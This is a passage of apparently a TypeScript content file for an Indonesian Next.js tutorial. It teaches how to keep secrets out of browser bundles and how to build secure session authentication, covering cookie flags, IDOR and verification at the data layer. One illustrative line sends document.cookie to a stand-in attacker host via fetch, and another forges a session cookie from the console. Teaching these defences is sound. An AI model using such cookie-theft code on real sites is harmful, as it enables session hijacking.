        '**Prefiks salah.** `NEXT_PUBLIC_API_SECRET` — namanya saja sudah kontradiksi, tapi ini benar-benar sering terjadi.',
        '**Rahasia dipakai di Client Component.** Berkas ber-`"use client"` yang membaca `process.env.API_SECRET` akan mendapat `undefined` — dan orang sering "memperbaikinya" dengan menambahkan `NEXT_PUBLIC_`.',
        '**Objek server dioper sebagai props.** Satu `<Klien user={user} />` dengan `user` mentah dari database mengirim seluruh barisnya ke browser lewat payload RSC.',
      ),

      h2('Menjaganya dengan `server-only`'),
      code(
        'ts',
        `
        // src/lib/db.ts
        import 'server-only';   // build GAGAL kalau berkas ini terimpor komponen klien

        export const db = buatKoneksi(process.env.DATABASE_URL!);
        `,
      ),
      p(
        'Paket `server-only` mengubah kesalahan diam menjadi kegagalan build. Pasangannya, `client-only`, mencegah modul yang butuh `window` terimpor di server.',
      ),

      h2('Validasi konfigurasi saat boot'),
      code(
        'ts',
        `
        import 'server-only';
        import { z } from 'zod';

        const Skema = z.object({
          DATABASE_URL: z.string().url(),
          API_SECRET: z.string().min(32),
        });

        // Fail loudly saat start, bukan diam-diam undefined di permintaan pertama.
        export const env = Skema.parse(process.env);
        `,
      ),
      p(
        'Aplikasi yang menolak menyala dengan pesan jelas jauh lebih mudah diperbaiki daripada aplikasi yang menyala lalu gagal misterius saat pengguna pertama datang.',
      ),

      h2('Checklist sebelum menyimpan'),
      ul(
        '`.env`, `.env.local`, dan berkas kunci ada di `.gitignore`.',
        'Yang di-commit hanya `.env.example` berisi placeholder **kosong** — bukan nilai asli "sebagai contoh".',
        'Tidak ada rahasia asli di belakang `NEXT_PUBLIC_`.',
        'Tidak ada rahasia yang di-`console.log`, termasuk saat debug.',
        'Rahasia yang **pernah** ter-commit dianggap bocor — rotasi, jangan cuma hapus riwayatnya.',
      ),
      callout(
        'warning',
        'Menghapus commit tidak menutup kebocoran',
        'Begitu sebuah rahasia masuk ke git dan di-push, ia sudah ada di setiap clone, setiap fork, dan kemungkinan besar sudah terindeks. Menulis ulang riwayat tidak menariknya kembali. Satu-satunya perbaikan yang benar adalah merotasi rahasianya.',
      ),
      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Kunci API layanan pembayaran disimpan di variabel bernama `NEXT_PUBLIC_KUNCI_PEMBAYARAN` supaya bisa dipakai di komponen mana pun tanpa error. Tiga bulan kemudian, seseorang menemukan kunci itu dengan membuka tab Network dan mencari di berkas JavaScript yang diunduh. Kunci itu ada di sana sejak hari pertama, terbaca siapa pun, dan tidak ada satu pun peringatan.',
      ),
      p(
        'Awalan `NEXT_PUBLIC_` bukan penanda kenyamanan melainkan **pernyataan bahwa nilainya boleh dilihat publik**. Next.js menyisipkannya langsung ke dalam bundel yang dikirim ke peramban.',
      ),
      code(
        'text',
        `
        Aturan yang menentukan:

        DATABASE_URL=postgres://...        -> HANYA di server. Tidak pernah ke peramban.
        KUNCI_PEMBAYARAN=sk_live_...       -> HANYA di server.
        NEXT_PUBLIC_URL_API=https://api... -> IKUT ke bundel peramban. Terbaca siapa pun.

        Yang berawalan NEXT_PUBLIC_ disisipkan ke dalam berkas JavaScript
        saat build, dan nilainya menjadi bagian dari kode yang diunduh pengguna.

        Menghapus awalannya SETELAH terlanjur dibangun tidak cukup.
        Kuncinya sudah tersebar, dan harus DIROTASI.
        `,
        { caption: 'Awalan itu keputusan keamanan, bukan keputusan teknis.' },
      ),
      code(
        'ts',
        `
        // Satu tempat yang membaca dan memvalidasi seluruh konfigurasi.
        import 'server-only';      // penjaga: modul ini TIDAK boleh sampai ke peramban
        import { z } from 'zod';

        const Skema = z.object({
          DATABASE_URL: z.string().url(),
          KUNCI_PEMBAYARAN: z.string().min(1),
          NODE_ENV: z.enum(['development', 'production', 'test']),
        });

        // Gagal saat boot, bukan saat permintaan pertama.
        const hasil = Skema.safeParse(process.env);
        if (!hasil.success) {
          throw new Error(
            \`Konfigurasi tidak lengkap: \${hasil.error.issues.map((i) => i.path[0]).join(', ')}\`,
          );
        }

        export const konfigurasi = hasil.data;
        `,
        { filename: 'src/lib/konfigurasi.ts' },
      ),
      p(
        'Impor `server-only` di baris pertama adalah penjaga yang mengubah kesalahan senyap menjadi kegagalan build. Diuji sungguhan dengan Next.js 16, mengimpor modul ini dari berkas ber-`use client` menghentikan build dengan pesan yang jelas. Tanpa itu, kesalahan mengimpornya tidak menghasilkan satu pun tanda dan seluruh isinya ikut ke bundel peramban.',
      ),
      p(
        'Memvalidasi dengan skema lalu melempar saat boot mengikuti aturan `backend.md` project ini, yaitu gagal cepat pada konfigurasi yang tidak lengkap. Layanan yang berhasil menyala dengan variabel yang hilang lalu gagal pada permintaan pertama jauh lebih sulit didiagnosa daripada yang menolak menyala dengan pesan yang menyebut variabel mana yang kurang.',
      ),
      code(
        'text',
        `
        Berkas mana yang ikut di git:

        .env.example      -> IKUT. Berisi nama variabel dengan nilai kosong.
        .env.local        -> TIDAK. Berisi nilai sungguhan di mesin pengembang.
        .env.production   -> TIDAK, kalau berisi rahasia.

        .gitignore wajib memuat .env*.local dan seluruh berkas berisi rahasia.
        `,
        { caption: 'Rahasia yang pernah masuk git dianggap bocor, walau commit-nya dihapus.' },
      ),
      callout(
        'danger',
        'Rahasia yang pernah masuk git harus dirotasi, bukan dihapus',
        'Menghapus commit tidak menghapus jejaknya dari salinan yang sudah diambil orang lain, dari cache layanan hosting git, maupun dari alat pemindai yang sudah membacanya. Aturan `security.md` menyebutnya tegas, yaitu rahasia yang pernah ter-commit dihitung bocor dan wajib diganti dengan yang baru.',
      ),

      h2('Saat error-nya muncul'),
      p('Empat kegagalan berikut, yang pertama dijalankan sungguhan dengan Next.js 16.2.12.'),
      code(
        'text',
        `
        // lib/db.ts
        import 'server-only';

        // Diimpor dari berkas ber-'use client':
        You're importing a module that depends on "server-only". This API is only
        available in Server Components in the App Router, but you are using it in
        the Pages Router.
        `,
        {
          caption: 'Dijalankan sungguhan. Penjaga yang mengubah kebocoran menjadi kegagalan build.',
        },
      ),
      p(
        'Ini penjaga yang paling berharga di seluruh sub-bab ini. Tanpa `server-only`, mengimpor modul berisi kredensial dari Client Component tidak menghasilkan satu pun tanda, dan seluruh isinya ikut ke bundel. Perhatikan pesannya menyebut Pages Router walaupun kamu memakai App Router, dan itu kekeliruan penulisan pesan di versi ini. Yang penting bagian pertamanya.',
      ),
      code(
        'text',
        `
        // Di Client Component:
        const kunci = process.env.KUNCI_PEMBAYARAN;
        console.log(kunci);

        # undefined. Tidak ada error.
        `,
        { caption: 'Variabel tanpa awalan publik tidak ada di peramban.' },
      ),
      p(
        'Ini justru perilaku yang benar dan sering disalahpahami sebagai bug. Variabel tanpa awalan `NEXT_PUBLIC_` memang tidak disisipkan ke bundel, sehingga nilainya `undefined` di peramban. Godaan terbesarnya adalah menambahkan awalan itu supaya errornya hilang, dan itu persis kesalahan pada cerita di awal. Pindahkan pemakaiannya ke server.',
      ),
      code(
        'text',
        `
        # NEXT_PUBLIC_KUNCI=sk_live_abc123 di .env.production

        $ grep -r "sk_live" .next/static/chunks/
        .next/static/chunks/app-a1b2c3.js:  "sk_live_abc123"

        # Kuncinya ada di berkas yang diunduh setiap pengunjung.
        `,
        { caption: 'Tidak ada error, dan rahasianya tersebar sejak build pertama.' },
      ),
      p(
        'Perintah `grep` di atas adalah cara memeriksanya yang paling cepat dan layak dijalankan sebelum setiap rilis. Kalau ada rahasia yang muncul di hasilnya, ia sudah tersebar ke setiap pengunjung yang pernah membuka situsmu. Menghapus awalannya menghentikan penyebaran berikutnya, dan tidak menarik kembali yang sudah tersebar.',
      ),
      code(
        'text',
        `
        # DATABASE_URL tidak disetel di lingkungan produksi.
        # Aplikasi menyala normal.
        # Permintaan pertama ke halaman produk:

        Error: connect ECONNREFUSED 127.0.0.1:5432
        `,
        { caption: 'Konfigurasi yang hilang baru ketahuan saat dipakai.' },
      ),
      p(
        'Aplikasi yang menyala dengan konfigurasi tidak lengkap adalah aplikasi yang gagal di tempat yang salah. Pesannya menyebut koneksi ditolak ke alamat lokal, dan itu sama sekali tidak menyebut bahwa `DATABASE_URL` yang tidak disetel. Memvalidasi saat boot mengubahnya menjadi pesan yang menyebut variabel mana yang kurang, sebelum satu pun pengguna terkena.',
      ),
      table(
        ['Pesan atau gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            '`importing a module that depends on "server-only"`',
            'Modul server diimpor dari Client Component',
            'Pindahkan pemanggilannya ke server, atau lewat Server Action',
          ],
          [
            '`process.env.X` bernilai `undefined` di peramban',
            'Variabel tanpa awalan publik memang tidak disisipkan',
            'Pindahkan pemakaiannya ke server, jangan menambah awalan publik',
          ],
          [
            'Rahasia ditemukan di berkas bundel',
            'Diberi awalan `NEXT_PUBLIC_`',
            'Hapus awalannya, dan **rotasi** kuncinya sebab sudah tersebar',
          ],
          [
            '`ECONNREFUSED` pada permintaan pertama',
            'Konfigurasi tidak divalidasi saat boot',
            'Validasi dengan skema dan lempar saat boot',
          ],
          [
            'Rahasia ter-commit ke git',
            'Berkas `.env` tidak diabaikan',
            'Tambahkan ke `.gitignore`, dan rotasi kuncinya',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Batas server dan klien adalah tempat kesalahan keamanan paling mahal terjadi, dan hampir seluruhnya tidak menghasilkan satu pun tanda.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Menambahkan `NEXT_PUBLIC_` supaya variabelnya terbaca',
            'Errornya hilang',
            'Nilainya disisipkan ke bundel dan terbaca setiap pengunjung. Kalau itu rahasia, ia sudah bocor',
          ],
          [
            'Tidak memakai `server-only` pada modul berisi kredensial',
            'Tidak ada yang mengimpornya dari klien',
            'Sampai ada yang mengimpornya, dan tidak ada satu pun peringatan',
          ],
          [
            'Membaca `process.env` tersebar di banyak berkas',
            'Lebih langsung',
            'Tidak ada satu tempat yang tahu variabel apa saja yang dibutuhkan, dan yang hilang baru ketahuan saat dipakai',
          ],
          [
            'Menghapus commit berisi rahasia dan menganggap selesai',
            'Sudah tidak ada di riwayat',
            'Salinan yang sudah diambil orang lain tetap memuatnya. Rotasi kuncinya',
          ],
          [
            'Mengoper object konfigurasi utuh ke Client Component',
            'Hanya butuh satu field',
            'Seluruh isinya diserialisasi dan terbaca di tab Network. Kirim field yang perlu saja',
          ],
          [
            'Memakai nilai bawaan yang terlihat sah untuk variabel yang hilang',
            'Supaya tidak error',
            'Aplikasi menyala dengan konfigurasi salah dan gagal di tempat yang membingungkan. Gagal cepat lebih baik',
          ],
        ],
      ),
      p(
        'Baris pertama adalah kesalahan yang paling sering dan paling mahal, dan ia lahir dari niat baik. Seseorang bertemu `undefined` di peramban, mencari solusinya, menemukan bahwa awalan itu memperbaikinya, lalu memakainya tanpa tahu artinya. Awalan itu berarti nilainya boleh dilihat publik, dan tidak ada satu pun yang memeriksa apakah itu benar.',
      ),
      callout(
        'tip',
        'Jalankan pemeriksaan ini sebelum setiap rilis',
        'Setelah `next build`, jalankan `grep -r "sk_live\\|password\\|secret" .next/static/` untuk mencari pola rahasia di berkas yang akan diunduh pengguna. Kalau ada hasilnya, jangan rilis. Pemeriksaan sepuluh detik itu menangkap kelas kebocoran yang tidak menghasilkan satu pun error.',
      ),
      references(
        {
          label: 'Environment Variables',
          href: 'https://nextjs.org/docs/app/guides/environment-variables',
          source: 'Next.js',
          note: 'Arti prefiks `NEXT_PUBLIC_` dan urutan pembacaan berkas `.env`.',
        },
        {
          label: 'Keeping Server-only Code out of the Client',
          href: 'https://nextjs.org/docs/app/getting-started/server-and-client-components#preventing-environment-poisoning',
          source: 'Next.js',
          note: 'Paket `server-only` yang mengubah kebocoran diam menjadi kegagalan build.',
        },
        {
          label: 'Secrets Management Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Kenapa rahasia yang pernah ter-commit wajib dirotasi, bukan sekadar dihapus riwayatnya.',
        },
        {
          label: 'Zod — parse vs safeParse',
          href: 'https://zod.dev/basics',
          source: 'Zod',
          note: 'Bentuk validasi konfigurasi yang fail loudly saat boot, bukan diam-diam `undefined`.',
        },
      ),
    ],
  ),

  written(
    'auth-nextjs',
    'Pola Autentikasi di Next.js',
    22,
    'Menyambungkan identitas pengguna dengan rendering server.',
    [
      p(
        'Autentikasi menjawab "siapa kamu"; otorisasi menjawab "boleh apa". Keduanya sering dicampur, dan campuran itulah sumber sebagian besar celah keamanan.',
      ),

      terms(
        {
          term: 'autentikasi',
          meaning:
            'Menjawab **"siapa kamu"** — memastikan pengguna adalah orang yang ia klaim. Contohnya login dengan password atau OAuth.',
        },
        {
          term: 'otorisasi',
          meaning:
            'Menjawab **"boleh apa"** — memastikan pengguna yang sudah dikenali memang berhak atas aksi ini. Keduanya sering dicampur, dan campuran itulah sumber sebagian besar celah keamanan: sudah login **tidak berarti** boleh mengakses.',
        },
        {
          term: 'session',
          meaning:
            'Catatan di **server** yang menandai satu pengguna sedang login; browser hanya menyimpan id-nya di cookie. Keunggulannya menentukan, sebab ia bisa **dicabut seketika**, dan itu baru terasa penting saat kamu paling membutuhkannya.',
        },
        {
          term: 'JWT',
          meaning:
            'Singkatan *JSON Web Token* — token bertanda tangan yang membawa datanya sendiri, sehingga server bisa memverifikasinya tanpa query. Harganya: **sulit dicabut**. Menarik karena stateless, tapi ketidakmampuan mencabutnya terasa persis saat logout, ganti password, dan akun dibajak.',
        },
        {
          term: 'HttpOnly',
          meaning:
            'Atribut cookie yang membuatnya **tidak bisa dibaca JavaScript sama sekali**. Ini pertahanan terhadap pencurian token lewat XSS — dan alasan token sesi tidak boleh disimpan di `localStorage`, yang bisa dibaca skrip mana pun di halamanmu.',
        },
        {
          term: 'Secure',
          meaning:
            'Atribut cookie yang membuatnya hanya dikirim lewat HTTPS. Tanpa ini, cookie bisa terbaca siapa pun yang menyadap jaringan — misalnya di Wi-Fi publik.',
        },
        {
          term: 'SameSite',
          meaning:
            'Atribut cookie yang mengatur apakah ia ikut terkirim ketika permintaan datang **dari situs lain**. Nilai `lax` memberi pertahanan **CSRF dasar**: situs jahat tidak bisa lagi memicu aksi mengubah data atas nama pengguna hanya karena cookie-nya otomatis ikut.',
        },
        {
          term: 'XSS',
          meaning:
            'Singkatan *Cross-Site Scripting* — penyerang berhasil menjalankan JavaScript-nya di halamanmu. Bisa lewat satu dependency yang dibajak atau satu HTML yang tidak disanitasi. Inilah ancaman yang membuat `HttpOnly` bukan pilihan melainkan keharusan.',
        },
        {
          term: 'verifikasi di tempat data diakses',
          meaning:
            'Prinsip penutup sub-bab ini: pemeriksaan di middleware adalah penyaring awal, **bukan** penjaga terakhir. Setiap query data wajib memverifikasi sesi dan men-scope hasilnya ke pemiliknya — karena di sanalah datanya benar-benar keluar.',
        },
      ),

      h2('Session cookie vs JWT'),
      table(
        ['', 'Session di server', 'JWT'],
        [
          ['Dicabut seketika', '**Ya**', 'Sulit — perlu deny-list'],
          ['Perlu penyimpanan server', 'Ya', 'Tidak'],
          ['Ukuran cookie', 'Kecil (id saja)', 'Lebih besar'],
          ['Cocok untuk', 'Aplikasi web biasa', 'Banyak layanan, API lintas domain'],
        ],
      ),
      p(
        'Untuk aplikasi Next.js biasa, session di server hampir selalu pilihan yang lebih tepat. JWT menarik karena stateless, tapi ketidakmampuan mencabutnya baru terasa saat kamu paling membutuhkannya: logout, ganti password, dan akun yang dibajak.',
      ),

      h2('Cookie yang benar'),
      code(
        'ts',
        `
        import { cookies } from 'next/headers';

        const jar = await cookies();

        jar.set('sesi', idSesi, {
          httpOnly: true,   // JavaScript tidak bisa membacanya -> aman dari pencurian via XSS
          secure: true,     // hanya dikirim lewat HTTPS
          sameSite: 'lax',  // tidak ikut terkirim dari situs lain -> pertahanan CSRF dasar
          path: '/',
          maxAge: 60 * 60 * 24 * 7,
        });
        `,
      ),
      p(
        "Kelima opsi ini bukan daftar praktik baik yang bisa dipilih sebagian, sebab masing-masing menutup celah yang berbeda, dan komentarnya sudah menandai tiga yang terpenting. `httpOnly` membuat cookie **tidak bisa dibaca JavaScript sama sekali**, sehingga celah XSS tidak otomatis berarti sesi tercuri. `secure` memastikan ia hanya melintas lewat HTTPS, menutup penyadapan di jaringan bersama. `sameSite: 'lax'` mencegah cookie ikut terkirim pada permintaan yang dipicu situs lain, yaitu pertahanan dasar terhadap CSRF, dan `lax` dipilih alih-alih `strict` supaya pengguna yang mengeklik tautan ke situsmu dari tempat lain tetap dianggap masuk. `path: '/'` membuatnya berlaku di seluruh aplikasi, dan `maxAge` dalam detik memberi umur tujuh hari, sebab tanpa itu cookie hilang begitu browser ditutup.",
      ),
      callout(
        'danger',
        'Jangan pernah menyimpan token sesi di `localStorage`',
        '`localStorage` bisa dibaca JavaScript mana pun yang berjalan di halamanmu. Satu celah XSS saja, entah dependency yang dibajak atau render HTML tak tersanitasi, sudah cukup untuk membuat seluruh token pengguna ikut tercuri. Cookie `HttpOnly` tidak bisa dibaca JavaScript sama sekali.',
      ),

      h2('Verifikasi di tempat datanya diakses'),
      code(
        'ts',
        `
        import 'server-only';
        import { cache } from 'react';

        // cache() membuat verifikasi hanya berjalan sekali per permintaan,
        // meski dipanggil dari banyak komponen.
        export const ambilSesi = cache(async () => {
          const jar = await cookies();
          const id = jar.get('sesi')?.value;
          if (id === undefined) return null;

          const sesi = await db.sesi.findUnique({
            where: { id },
            include: { user: { select: { id: true, nama: true, peran: true } } },
          });

          if (sesi === null || sesi.kedaluwarsa < new Date()) return null;
          return sesi;
        });
        `,
      ),
      code(
        'tsx',
        `
        // Di setiap halaman terlindungi
        export default async function Dasbor() {
          const sesi = await ambilSesi();
          if (sesi === null) redirect('/masuk');

          return <IsiDasbor user={sesi.user} />;
        }
        `,
      ),
      p(
        'Perhatikan bahwa `ambilSesi` dibungkus `cache()` dari React, mekanisme yang sama yang dibahas di sub-bab pengambilan data awal bab ini. Kalau `Header`, `Sidebar`, dan `Dasbor` sama-sama memanggil `ambilSesi()` dalam satu render, hanya **satu** query ke database yang benar-benar dijalankan, sebab React membagikan hasil pemanggilan pertama ke pemanggil berikutnya dalam render yang sama. Fungsi ini juga mengembalikan `null` untuk dua kondisi berbeda yang keduanya berarti "tidak ada sesi yang sah". Kemungkinannya cookie-nya tidak ada sama sekali (`id === undefined`), atau sesinya ditemukan tetapi sudah lewat `kedaluwarsa`. Pemanggilnya (`Dasbor`) tidak perlu tahu bedanya, sebab cukup memeriksa `sesi === null` lalu mengalihkan ke halaman masuk. Pola `import \'server-only\'` di baris pertama memastikan modul ini tidak bisa diimpor Client Component sama sekali, dan build akan gagal kalau ada yang mencoba, sesuai aturan dari sub-bab environment variable sebelumnya.',
      ),

      h2('Otorisasi harus di lapisan data'),
      compare(
        {
          title: 'Salah — IDOR',
          lang: 'ts',
          code: `
          // id datang dari klien.
          // Siapa pun bisa mengubah angkanya
          // dan membaca catatan orang lain.
          const catatan = await db.catatan.findUnique({
            where: { id },
          });
          `,
          notes: ['ID dari klien bukan bukti kewenangan'],
        },
        {
          title: 'Benar',
          lang: 'ts',
          code: `
          const sesi = await ambilSesi();
          if (sesi === null) return null;

          const catatan = await db.catatan.findFirst({
            where: { id, userId: sesi.userId },
          });
          `,
          notes: ['Query di-scope ke pemiliknya', 'Milik orang lain mengembalikan null'],
        },
      ),
      p(
        'Menyembunyikan tombol di UI bukan kontrol akses. Pemeriksaan yang menentukan harus ada di tempat datanya benar-benar diambil.',
      ),

      h2('Hal yang wajib ada di alur login'),
      ol(
        '**Hash password dengan algoritma adaptif** — argon2id, bcrypt, atau scrypt. Jangan pernah MD5, SHA biasa, atau tanpa salt.',
        '**Pesan gagal yang sama** untuk "password salah" dan "email tidak terdaftar" — supaya akun tidak bisa dienumerasi.',
        '**Rate limit per akun dan per IP.** Per IP saja lolos oleh botnet; lockout polos bisa dipakai mengunci akun korban.',
        '**Regenerasi ID sesi setelah login berhasil** untuk mencegah session fixation.',
        '**Cabut sesi** saat logout, ganti password, dan perubahan izin — di server, bukan hanya menghapus cookie di klien.',
        '**Token reset password sekali pakai** dan berumur pendek.',
      ),
      callout(
        'info',
        'Jangan menulis sendiri kalau ada pilihan',
        'Autentikasi adalah area di mana kesalahan kecil berakibat besar dan tidak terlihat sampai terlambat. Untuk project TypeScript, pertimbangkan library yang matang seperti Better Auth atau Auth.js — dan tetap baca daftar di atas, karena library pun bisa dikonfigurasi dengan tidak aman.',
      ),
      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Halaman admin dilindungi middleware yang memeriksa cookie sesi. Seorang penguji keamanan membuka console peramban, mengetik satu baris yang menyetel cookie bernama `sesi` berisi teks acak, lalu membuka halaman admin dan berhasil masuk. Middleware memeriksa bahwa cookienya **ada**, bukan bahwa isinya sah.',
      ),
      p(
        'Autentikasi di App Router punya tiga lapisan, dan mengandalkan satu saja selalu meninggalkan celah.',
      ),
      table(
        ['Lapisan', 'Yang diperiksa', 'Cukup sendirian?'],
        [
          ['Middleware', 'Keberadaan cookie, untuk mengalihkan cepat', '**Tidak**'],
          ['Halaman atau layout', 'Keabsahan sesi, untuk memutuskan tampilan', 'Tidak'],
          ['Lapisan data', 'Keabsahan sesi **dan** kepemilikan datanya', '**Ini yang menentukan**'],
        ],
        'Aturan `security.md` menyebutnya zero trust, yaitu diverifikasi di tempat data diakses.',
      ),
      code(
        'ts',
        `
        import 'server-only';
        import { cache } from 'react';
        import { cookies } from 'next/headers';

        // cache dari React: dipanggil berkali-kali dalam satu render,
        // dan verifikasinya hanya berjalan sekali.
        export const bacaSesi = cache(async () => {
          const token = (await cookies()).get('sesi')?.value;
          if (!token) return null;

          try {
            // Verifikasi TANDA TANGAN, bukan sekadar keberadaan.
            const isi = await verifikasiToken(token);

            // Periksa pencabutan. Token yang sah bisa saja sudah dicabut
            // karena keluar, ganti sandi, atau akun dinonaktifkan.
            const sesi = await db.sesi.findUnique({ where: { id: isi.sesiId } });
            if (!sesi || sesi.dicabutPada) return null;

            return { penggunaId: sesi.penggunaId, peran: sesi.peran };
          } catch {
            return null;      // token cacat atau kedaluwarsa
          }
        });

        // Dipakai di halaman yang wajib masuk.
        export async function wajibMasuk() {
          const sesi = await bacaSesi();
          if (!sesi) redirect('/masuk');
          return sesi;
        }
        `,
        { filename: 'src/auth/sesi.ts' },
      ),
      p(
        'Pembungkusan dengan `cache` dari React menyelesaikan masalah yang muncul begitu pemeriksaan sesi dipakai di banyak tempat. Tanpa itu, halaman yang memeriksanya di layout, di halaman, dan di tiga komponen akan menjalankan verifikasi lima kali termasuk lima kueri database. Dengan itu, hanya sekali per render dan sisanya memakai hasil yang sama.',
      ),
      p(
        'Pemeriksaan pencabutan adalah bagian yang sering dilewatkan. Token yang tanda tangannya sah dan belum kedaluwarsa bisa saja sudah tidak berlaku, misalnya karena penggunanya keluar, mengganti kata sandi, atau akunnya dinonaktifkan. Tanpa memeriksanya, seseorang yang tokennya tersalin tetap bisa masuk sampai token itu kedaluwarsa sendiri.',
      ),
      code(
        'ts',
        `
        'use server';

        export async function hapusPesanan(id: string) {
          // Lapisan ketiga: verifikasi DI SINI, di tempat data disentuh.
          const sesi = await bacaSesi();
          if (!sesi) return { galat: 'Tidak berhak' };

          // Scope ke pemiliknya. Id dari klien bukan bukti kepemilikan.
          const terhapus = await db.pesanan.deleteMany({
            where: { id, penggunaId: sesi.penggunaId },
          });

          if (terhapus.count === 0) return { galat: 'Pesanan tidak ditemukan' };

          revalidatePath('/pesanan');
          return { galat: null };
        }
        `,
        { filename: 'app/pesanan/aksi.ts' },
      ),
      p(
        'Bagian `where` yang memuat `penggunaId` dari sesi adalah pertahanan terhadap IDOR. Tanpa itu, mengganti id di permintaan berarti bisa menghapus pesanan siapa pun. Perhatikan juga responsnya sengaja berbunyi tidak ditemukan alih-alih tidak berhak, sebab membedakan keduanya memberi tahu penyerang bahwa id itu memang ada.',
      ),
      p(
        'Menyembunyikan tombol Hapus dari pengguna yang bukan pemiliknya tetap benar sebagai pengalaman pengguna, dan sama sekali bukan kontrol akses. Server Action punya alamat publik yang bisa dipanggil tanpa lewat halamanmu, dan itu sudah dibahas di sub-bab Server Action.',
      ),
      callout(
        'danger',
        'Cookie sesi wajib punya empat penanda',
        '`HttpOnly` supaya tidak terbaca JavaScript, `Secure` supaya hanya lewat HTTPS, `SameSite` untuk menutup sebagian besar CSRF, dan masa berlaku yang wajar. Melewatkan `HttpOnly` berarti satu celah XSS di halaman mana pun cukup untuk mencuri sesi seluruh pengguna. Aturan `security.md` mengikat penuh di sini.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Empat kegagalan berikut adalah yang paling sering, dan tiga di antaranya tidak menghasilkan satu pun pesan.',
      ),
      code(
        'text',
        `
        # Middleware memeriksa keberadaan cookie 'sesi'.
        # Di console peramban: document.cookie = 'sesi=apasaja';

        # Halaman admin terbuka. Tidak ada error.
        `,
        { caption: 'Keberadaan cookie dianggap bukti sesi yang sah.' },
      ),
      p(
        'Menyetel cookie adalah hal yang bisa dilakukan siapa pun dari console. Middleware berguna sebagai penyaring cepat yang mengurangi permintaan tidak perlu, dan verifikasi tanda tangan harus dilakukan di tempat yang berjalan di Node.js penuh. Ini sudah dibahas di sub-bab middleware, dan diulang di sini karena akibatnya paling besar.',
      ),
      code(
        'text',
        `
        const sesi = await bacaSesi();       // dipanggil di layout
        // ...dan di page, dan di tiga komponen

        # Lima verifikasi, lima kueri database, untuk satu permintaan.
        # Tidak ada error. Halamannya lambat.
        `,
        { caption: 'Pemeriksaan sesi tidak dibungkus cache.' },
      ),
      p(
        'Tidak ada error, dan biayanya berupa halaman yang lebih lambat dan beban database yang berlipat. Fungsi `cache` dari React menyelesaikannya dengan satu pembungkus, dan cakupannya tepat, yaitu satu render permintaan. Ini berbeda dari cache lintas permintaan yang justru berbahaya untuk data sesi.',
      ),
      code(
        'text',
        `
        await db.pesanan.delete({ where: { id } });    // tanpa penggunaId

        # Pengguna A memanggil aksi dengan id milik pengguna B.
        # Pesanan B terhapus. Tidak ada error.
        `,
        { caption: 'IDOR. Id dari klien dianggap bukti kepemilikan.' },
      ),
      p(
        'Ini kelas kerentanan yang paling sering di aksi yang ditulis sendiri, dan tidak ada satu pun tanda. Setiap kali kamu menulis `where` yang memuat id dari klien, tanyakan apakah ada yang memastikan pemanggilnya berhak atas id itu. Kalau tidak, tambahkan `penggunaId` dari sesi ke dalam kondisinya.',
      ),
      code(
        'text',
        `
        # Cookie sesi disetel tanpa HttpOnly.
        # Satu celah XSS di halaman ulasan:

        fetch('https://penyerang.id/?c=' + document.cookie);

        # Sesi seluruh pengunjung halaman itu berpindah tangan.
        `,
        { caption: 'Tidak ada pesan apa pun, dan ini kegagalan paling mahal.' },
      ),
      p(
        'Penanda `HttpOnly` membuat cookie tidak terbaca JavaScript sama sekali, sehingga celah XSS tidak bisa mencurinya. Ini sudah dibahas di Bab 5 Frontend Basic, dan di sini konsekuensinya penuh. Empat penanda cookie bukan penyempurnaan melainkan syarat, dan melewatkan satu saja membuka jalur yang tidak bisa ditutup dari tempat lain.',
      ),
      table(
        ['Gejala', 'Penyebab sebenarnya', 'Perbaikannya'],
        [
          [
            'Cookie palsu lolos ke halaman terlindungi',
            'Hanya keberadaan cookie yang diperiksa',
            'Verifikasi tanda tangan dan pencabutan di lapisan data',
          ],
          [
            'Halaman lambat, banyak kueri sesi',
            'Pemeriksaan sesi tidak dibungkus `cache`',
            'Bungkus dengan `cache` dari React',
          ],
          [
            'Pengguna bisa menghapus data milik orang lain',
            'Id dari klien dianggap bukti kepemilikan',
            'Tambahkan `penggunaId` dari sesi ke kondisi kueri',
          ],
          [
            'Sesi bisa dicuri lewat XSS',
            'Cookie tanpa `HttpOnly`',
            'Setel `HttpOnly`, `Secure`, `SameSite`, dan masa berlaku',
          ],
          [
            'Pengguna yang sudah keluar masih bisa mengakses',
            'Pencabutan token tidak diperiksa',
            'Periksa catatan sesi di database, bukan hanya masa berlakunya',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Autentikasi adalah bagian yang paling mahal kalau salah, dan sebagian besar kesalahan berasal dari memeriksa di satu lapisan saja.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Mengandalkan middleware sebagai satu-satunya penjaga',
            'Ia berjalan sebelum semuanya',
            'Ia hanya memeriksa keberadaan cookie. Cookie palsu lolos',
          ],
          [
            'Menyembunyikan tombol sebagai kontrol akses',
            'Pengguna biasa tidak melihatnya',
            'Server Action dan Route Handler punya alamat publik. Periksa di dalamnya',
          ],
          [
            'Memakai id dari klien untuk menentukan pemilik data',
            'Klien yang tahu id-nya',
            'Itu IDOR. Baca id pemilik dari sesi yang sudah diverifikasi',
          ],
          [
            'Menyimpan token sesi di `localStorage`',
            'Lebih mudah dijangkau',
            'Satu celah XSS cukup untuk mencurinya. Pakai cookie `HttpOnly`',
          ],
          [
            'Memeriksa masa berlaku saja tanpa pencabutan',
            'Tokennya belum kedaluwarsa',
            'Pengguna yang sudah keluar atau akunnya dinonaktifkan tetap bisa masuk',
          ],
          [
            'Menulis sistem autentikasi sendiri dari nol',
            'Supaya paham dan tidak tergantung pustaka',
            'Hashing, rotasi token, dan CSRF punya banyak detail yang mudah salah. Pakai pustaka yang teruji',
          ],
        ],
      ),
      p(
